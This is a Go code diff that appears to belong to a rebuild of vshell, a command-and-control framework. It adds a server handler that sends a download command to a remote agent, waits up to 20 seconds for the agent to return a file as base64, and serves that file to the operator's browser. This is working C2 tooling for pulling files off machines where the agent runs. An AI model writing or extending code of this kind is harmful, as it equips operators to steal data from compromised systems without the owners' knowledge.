@@ -30,9 +30,12 @@ import (
 	"log"
 	"path/filepath"
 	"sort"
+	"net/http"
 	"strconv"
 	"strings"
 	"time"
+
+	"vshell/c2engine"
 )
 
 // FileController 管理客户端文件系统。
@@ -362,14 +365,68 @@ func (c *FileController) GetDownloadPer() {
 // DownloadToBrowser 浏览器下载（POST /file/downloadtobrowser）。参数：id / target。
 func (c *FileController) DownloadToBrowser() {
 	id := c.clientID()
+	path := c.JsonGetStr("path")
 	target := c.JsonGetStr("target")
 	if id == 0 {
 		c.JsonErr("id error")
 		return
 	}
-	// 原版将 target 文件 base64 回传后由服务器以附件形式输出
-	engineDownloadToServer(id, target, "")
-	c.JsonOkMessage("ok")
+	if path == "" && target == "" {
+		c.JsonErr("path required")
+		return
+	}
+	remote := joinPath(path, target)
+	if path == "" {
+		remote = target
+	}
+
+	// 下发 JSON 命令让 agent 读文件并回 base64（agent 的 CmdDownload 分支），
+	// 拿到结果后以附件形式输出——原版同样是"agent 回传 base64 → 服务器落附件"。
+	cmd, _ := json.Marshal(map[string]string{"type": "download", "path": remote})
+	task, err := dispatchCmd(id, string(cmd))
+	if err != nil {
+		c.JsonErr(err.Error())
+		return
+	}
+	if task == 0 {
+		c.JsonErr("download failed")
+		return
+	}
+
+	// 小文件同步等待（20s）：大文件应走 downloadtoserver + getdownloadper 的
+	// 分块路径（尚未实现，见 docs/STATUS.md）。
+	t := c2engine.GetEngine().GetTask(task)
+	deadline := time.Now().Add(20 * time.Second)
+	for time.Now().Before(deadline) {
+		if t == nil {
+			break
+		}
+		if t.Status != "pending" && t.Status != "dispatched" {
+			break
+		}
+		time.Sleep(100 * time.Millisecond)
+		t = c2engine.GetEngine().GetTask(task)
+	}
+	if t == nil || t.Status != "completed" {
+		c.JsonErr("download timeout")
+		return
+	}
+	data, derr := base64.StdEncoding.DecodeString(strings.TrimSpace(t.Result))
+	if derr != nil {
+		c.JsonErr("agent returned invalid data: " + t.Result)
+		return
+	}
+
+	name := filepath.Base(remote)
+	if name == "" || name == "." || name == "/" {
+		name = "download.bin"
+	}
+	w := c.Ctx.ResponseWriter
+	w.Header().Set("Content-Type", "application/octet-stream")
+	w.Header().Set("Content-Disposition", "attachment; filename="+name)
+	w.Header().Set("Content-Length", strconv.Itoa(len(data)))
+	w.WriteHeader(http.StatusOK)
+	_, _ = w.Write(data)
 }
 
 // DownloadToOSS 下载到 OSS（POST /file/downloadtooss）。参数：id / path / target。
